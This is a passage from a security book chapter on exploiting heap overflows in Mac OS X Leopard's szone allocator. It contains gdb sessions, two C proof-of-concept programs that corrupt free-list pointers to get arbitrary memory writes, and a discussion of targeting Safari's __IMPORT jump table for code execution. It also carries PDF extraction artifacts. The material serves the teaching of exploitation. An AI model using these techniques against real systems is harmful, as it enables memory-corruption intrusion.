Notice that ptr2 was not placed on the free list. If you look at ptr1, you can see
that its previous and next pointers are NULL once again. Also, its size fi eld now
indicates that the block is 1,488 bytes long. As ptr2 was freed, szone identifi ed
that the block lay in between two already-free blocks and all three blocks were
coalesced into one large free block. The size of the free block has changed, so
this free block is now on a different free list from the free list that was used
when the blocks were a smaller size.
The operation of the tiny region is pretty straightforward and easy to under-
stand. Unfortunately, as the memory blocks get bigger, the heap gets more
complicated. Next we’ll examine how the small region is slightly different. If
we change the allocation size from 496 to 1,496 bytes, the allocations will be
made in the small region instead of the tiny region.
(gdb) run
Starting program: /Volumes/Data/Users/ddz/Projects/LeopardHunting/
Chapters/08 Exploiting Heap Overflows/Code/small1
Reading symbols for shared libraries ++. done
Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=1, argv=0xbffff6b8) at small1.c:16
16 free(ptr1);
(gdb) cont
Continuing.
9955336633cc0088..iinndddd 119911 11//2255//0099 44::4422::0099 PPMM
192 Part III ■ Exploitation
Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=1, argv=0xbffff6b8) at small1.c:18
18 free(ptr3);
(gdb) x/3x ptr1
0x800000: 0x00000000 0x00000000 0x00000000
This time, ptr1 was not immediately placed on the free list after it was freed,
as it was when we were allocating memory in the tiny region. Observe what
happens after the second free.
(gdb) cont
Continuing.
Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=1, argv=0xbffff6b8) at small1.c:20
20 free(ptr2);
(gdb) x/3x ptr1
0x800000: 0xc0000003 0xc0000003 0x00000000
(gdb) x/3x ptr3
0x800c00: 0x00000000 0x00000000 0x00000000
At this point, ptr1 has actually been placed on the free list and the most
recently freed pointer, ptr3, has similarly not been placed on the free list. This
is because the small region uses the last-free cache, whereas the tiny region
does not. The last-free cache stores the most recently freed block and does not
put that block on the free list unless it is expired from the cache. In this case,
ptr1 was just replaced in the cache by ptr3 and so ptr1 ended up on the free list.
Also, notice that the small region no longer stores the block size after the free
list pointers. The size of a free block in quanta is stored as a short in the last
two bytes of the free block.
The astute reader may notice that storing heap metadata in the heap buffers
puts them in harm’s way if data written to a nearby heap block overfl ows. In
the next section we will demonstrate how to exploit heap overfl ows by carefully
overwriting the heap metadata stored in heap blocks on the free list.
Overwriting Heap Metadata
As we hinted at, being able to overwrite heap metadata through the exploitation
of a heap buffer overfl ow vulnerability can be a serious problem. Heap metadata
exploits are well understood on other platforms, such as Windows and Linux,
and have been made virtually extinct by those platforms incorporating heap
exploit defenses into their heaps. Leopard’s heap implementation, however, has
no such exploit defenses.
9955336633cc0088..iinndddd 119922 11//2255//0099 44::4422::0099 PPMM
Chapter 8 ■ Exploiting Heap Overflows 193
In the following sections we demonstrate two techniques for exploiting over-
written heap metadata. We will do this by crafting small test programs that
perform some heap operations, overwrite some values in the heap buffers, and
perform more heap operations. These represent the heap operations that a vul-
nerable program may perform prior to and after a heap-buffer overfl ow occurs.
Later in this chapter and in Chapter 9, “Exploit Payloads,” we will show how to
put these techniques to use in real-world exploits.
The fi rst technique uses the free list unlink operation to write a chosen value
to a chosen memory location. This has been a common heap exploitation tech-
nique on other platforms, such as Linux, Windows, and the iPhone. The second
technique uses the free list unlink operation to place a chosen pointer on the
head of a free list so that a subsequent allocation request will return a pointer
to a chosen location outside the heap.
Arbitrary 4-Byte Overwrite
Consider the following code, which is a snippet from tiny_free_list_remove_
ptr() in scalable_heap.c.
// Note: ptr->next and ptr->previous are overwritten after a heap
overflow
next = free_list_unchecksum_ptr(ptr->next);
*free_list = next; // Chosen value for free list head
this_msize = get_tiny_free_size(ptr);
if (next) {
next->previous = ptr->previous; // Write chosen value anywhere
} else {
BITMAP32_CLR(szone->tiny_bitmap, this_msize - 1);
}
The variable ptr is the pointer to a free block that is being removed from the
free list in order to be returned to the user to satisfy an allocation request. Since
the metadata stored within a free block can be overwritten in a heap buffer
overfl ow, ptr->next and ptr->previous can be values controlled by an attacker.
When ptr->previous is assigned to next->previous, we can write a value we
control to a memory location we choose. There are some restrictions. The next
pointer is decoded from its checksum form, which assumes that all heap blocks
are aligned on 16-byte boundaries, and clears the lowest-order four bits of this
value. This means the address that we want to write to must be aligned on
a 16-byte boundary. There are some benefi ts from this checksum algorithm,
however. Because the checksum rotates the pointer and sets the highest bit of
the word, we can write to memory addresses that have a NULL byte in the most
signifi cant byte, which we normally can’t do in a string-based buffer overfl ow.
You will see why this is very important when we show how to obtain code
execution through even a single 4-byte overwrite.
9955336633cc0088..iinndddd 119933 11//2255//0099 44::4422::0099 PPMM
194 Part III ■ Exploitation
For an example of how overwriting a free heap block can be used to perform
an arbitrary 4-byte memory write, look at the following code.
#include 
#include 
/*
* Taken from Mac OS X Libc source code
*/
static unsigned long free_list_checksum_ptr(unsigned long p)
{
#ifdef __LP64__
return (p >> 2) | 0xC000000000000003ULL;
#else
return (p >> 2) | 0xC0000003U;
#endif
}
#define ALLOC_SIZE 496
int main(int argc, char* argv[])
{
unsigned long *target;
unsigned long *ptr;
// Allocate our target on heap so it is aligned
target = malloc(4);
*target = 0xfeedface;
printf(“target = 0x%x\n”, *target);
printf(“ptr = calloc(ALLOC_SIZE,1)\n”);
ptr = (unsigned long*)calloc(ALLOC_SIZE,1);
// Freeing ptr will place it on a free list
printf(“free(ptr)\n”);
free(ptr);
// Overwrite ptr’s previous and next block pointers
printf(“Overwriting ptr->previous and ptr->next…\n”);
ptr[0] = 0xdeadbeef;
ptr[1] = free_list_checksum_ptr((unsigned long)target);
// malloc will remove ptr from free list,
// overwriting our target in the unlinking
printf(“ptr = malloc(ALLOC_SIZE)\n”);
ptr = (unsigned long*)malloc(ALLOC_SIZE);
printf(“==> target = 0x%x\n”, *target);
exit(EXIT_SUCCESS);
}
9955336633cc0088..iinndddd 119944 11//2255//0099 44::4422::0099 PPMM
Chapter 8 ■ Exploiting Heap Overflows 195
This code fi rst makes sure ptr is placed on a free list (it is allocated from
the tiny region, so we do not have to worry about the last-free cache). Next we
simulate a buffer overfl ow overwriting the free list previous and next pointers
stored in ptr when ptr is on a free list. This would happen if there were over-
fl ow in the block preceding ptr and an attacker were able to overwrite ptr with
chosen values as depicted in Figure 8-2.
Before Overflow After Overflow
In-Use Block In-Use Block
00xx0000:: ddaattaa 0x00: AAAA
0xdeadbeef
00xx0044:: ddaattaa 0x04: AAAA
00xx0088:: ddaattaa 0x08: AAAA
00xx00cc:: ddaattaa 0x0c: AAAA
Free Block Free Block
0x00: previous pointer 0x00: 0xdeadbeef Target
0x04: next pointer 0x04: cksum(target) 0xfeedface
0x08: block size 0x08: block size
0x0c: empty space 0x0c: empty space
Figure 8-2: A heap-buffer overflow from an in-use block overwriting a free block
Finally, we perform a malloc() for the same size as ptr so that it is removed
from the free list. When the block is removed from the free list, the linked list
remove operation will write 0xdeadbeef to target, overwriting its previous value
of 0xfeedface. We can confi rm this by compiling and running tiny-write4.
% ./tiny-write4
target = 0xfeedface
ptr = calloc(ALLOC_SIZE,1);
free(ptr)
Overwriting ptr->previous and ptr->next…
ptr = malloc(ALLOC_SIZE)
==> target = 0xdeadbeef
As you can see, the unlink of the overwritten free list block has overwritten
the target memory address with our chosen value. Once an attacker can write
arbitrary values to arbitrary memory locations, it is usually “game over,” and
there is a variety of ways to turn this into remote code execution, some of which
we will demonstrate in the next section.
Large Arbitrary Memory Overwrite
In their presentation at CanSecWest 2004 titled “Reliable Windows Heap
Exploits,” Matt Conover and Oded Horovitz introduced a novel way of using
9955336633cc0088..iinndddd 119955 11//2255//0099 44::4422::1100 PPMM
196 Part III ■ Exploitation
a heap metadata overfl ow to overwrite large amounts of data at a chosen loca-
tion, not just 4 bytes as described earlier. Their idea was to manipulate the
heap’s free lists to cause them to return a nonheap memory address for a given
memory allocation request. The following code demonstrates this technique
for Mac OS X.
#include 
#include 
/*
* Taken from MacOS X Libc source code
*/
static unsigned long free_list_checksum_ptr(unsigned long p)
{
return (p >> 2) | 0xC0000003U;
}
#define ALLOC_SIZE 496
int main(int argc, char* argv[])
{
unsigned long *target = (unsigned long*)&target;
unsigned long *ptr;
printf(“ptr = calloc(ALLOC_SIZE,1)\n”);
ptr = (unsigned long*)calloc(ALLOC_SIZE,1);
// Freeing ptr will place it in last-free cache
printf(“free(ptr)\n”);
free(ptr);
// Overwrite ptr’s previous and next block pointers
printf(“Overwriting ptr->previous and ptr->next…\n”);
ptr[0] = 0xdeadbeef;
ptr[1] = free_list_checksum_ptr((unsigned long)target);
// malloc will remove ptr from free list,
// placing our target as the free list head
printf(“ptr = malloc(ALLOC_SIZE)\n”);
ptr = (unsigned long*)malloc(ALLOC_SIZE);
// Now allocate the same size again and we are returned
// a non-heap pointer by malloc
printf(“ptr = malloc(ALLOC_SIZE)\n”);
ptr = (unsigned long*)malloc(ALLOC_SIZE);
printf(“==> ptr = 0x%x\n”, ptr);
exit(EXIT_SUCCESS);
}
9955336633cc0088..iinndddd 119966 11//2255//0099 44::4422::1100 PPMM
Chapter 8 ■ Exploiting Heap Overflows 197
The code is very similar to our earlier 4-byte overwrite example. The key
difference is that there are two calls to malloc() after the free block has been
overwritten. The fi rst call performs the arbitrary 4-byte overwrite as before.
This time, however, the code performs a second malloc() for the same size.
Recall from the beginning of this section that the code for removing an entry
from the free list updates the free list head with the next pointer from the free
block. Since we control this value, we can cause a subsequent malloc() of the
same size to return a chosen memory address. In applications where the attacker
can infl uence the sizes of memory allocations where their input is stored, they
can use this to write as much of their input as they want to a chosen memory
location. That is much better than just writing 4 bytes!
Now run the test program to see what happens.
% ./tiny-write
ptr = calloc(ALLOC_SIZE,1)
free(ptr)
Overwriting ptr->previous and ptr->next…
ptr = malloc(ALLOC_SIZE)
ptr = malloc(ALLOC_SIZE)
==> ptr = 0xbffff890
As you can see, the second call to malloc() returned a pointer that is defi nitely
not on the heap, as it is an address in stack memory. This sort of heap manipula-
tion will let you overwrite more memory than just one word at a time, like the
previous example.
Obtaining Code Execution
In the preceding examples we showed how to overwrite 4 bytes at a chosen
memory address or cause the heap to return an arbitrary memory address for
an allocation request. We can use these techniques to overwrite four or more
bytes of the target’s memory with chosen values, but the big question is, how do
we leverage that into reliable, arbitrary code execution? There are many ways
to achieve this, each with their own strengths and weaknesses, but we will
describe one technique that takes advantage of a unique aspect of Leopard’s
heap implementation.
Recall from our discussion earlier that the pointers in free blocks use a check-
sum to detect accidental corruption. This checksum takes advantage of the
unused lowest four bits in the memory address and generates a checksum via
((ptr >> 2) | 0xC0000003U). Since the free list unlink operation will clear these
bits, it allows the attacker to specify addresses with NULL bytes for both or
either of the most signifi cant and least signifi cant bytes of the memory address.
9955336633cc0088..iinndddd 119977 11//2255//0099 44::4422::1100 PPMM
198 Part III ■ Exploitation
Let’s take a look at a vmmap output to see what memory regions this opens for
us. As a quick example, examine the memory-address space of the shell.
Virtual Memory Map of process 32297 (tcsh)
Output report format: 2.2 -- 32-bit process
…
==== Writable regions for process 32297
__DATA 0003e000-00042000 [ 16K] rw-/rwx SM=COW /bin/tcsh
__DATA 00042000-00096000 [ 336K] rw-/rwx SM=PRV /bin/tcsh
__IMPORT 00096000-00097000 [ 4K] rwx/rwx SM=COW /bin/tcsh
MALLOC (freed?) 0009b000-0009c000 [ 4K] rw-/rwx SM=PRV
MALLOC_LARGE 0009d000-000b1000 [ 80K] rw-/rwx SM=COW DefaultMalloc
MALLOC_LARGE 000b2000-000ba000 [ 32K] rw-/rwx SM=PRV DefaultMalloc
MALLOC_REALLOC 000ba000-000c4000 [ 40K] rw-/rwx SM=PRV DefaultMalloc
MALLOC_TINY 00100000-00200000 [ 1024K] rw-/rwx SM=PRV DefaultMalloc
SBRK 00200000-00600000 [ 4096K] rw-/rwx SM=NUL
MALLOC_SMALL 00800000-01000000 [ 8192K] rw-/rwx SM=PRV DefaultMalloc
…
Being able to write to addresses with a NULL most-signifi cant byte in the
address allows us to write to the malloc regions as well as the executable’s
__DATA and __IMPORT segments. The __DATA segments may contain useful
targets such as function pointers, but the __IMPORT segment will be a much
more interesting target.
The __IMPORT segment contains two critical sections: __jump_table, and __
pointers. The __jump_table section contains stubs for calls into dynamic libraries
and the __pointers section contains symbol pointers to functions imported from
a different fi le. The __jump_table stubs are small sequences of executable code
written to by the linker that jump to the proper symbol in a loaded shared library.
When the executable needs to call a shared library function, it calls the stub in
the __jump_table, which jumps to the function defi nition in the shared library.
We can examine the contents of these sections with otool -vI. For the __ump_
table, this will list the name of the shared library function for the stub and its
addresses in the __IMPORT segment. Recall that because of the checksum, our
overwrite target must be 16-byte aligned. Also, the base load address of the
executable is not randomized in Leopard; only loaded libraries are. Therefore,
any overwrite targets in the __IMPORT segment of the main executable will be
at constant addresses. We can dump this table and search for any stub with a
properly aligned address to fi nd suitable overwrite targets. For example, here
are some suitable targets from Safari.
% otool -vI /Applications/Safari.app/Contents/MacOS/Safari | \